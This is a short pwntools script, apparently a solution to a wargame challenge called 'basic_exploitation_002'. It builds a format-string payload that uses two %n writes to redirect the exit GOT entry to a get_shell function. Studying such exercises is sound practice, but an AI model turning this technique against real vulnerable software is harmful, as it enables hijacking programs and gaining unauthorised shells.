# Check https://www.youtube.com/watch?v=t1LH9D5cuK4
from pwn import *
import sys

# context.log_level = True
#
# p = process('./basic_exploitation_002')
# e = ELF('./basic_exploitation_002')

GET_SHELL = 0x8048609
EXIT_GOT = 0x804a024

payload = b""
payload += p32(EXIT_GOT)
payload += p32(EXIT_GOT+2)
payload += b"BBBBCCCC"
payload += b"%1$34297x"
payload += b"%1$n"
payload += b"%2$33275x"
payload += b"%2$n"

sys.stdout.buffer.write(payload)
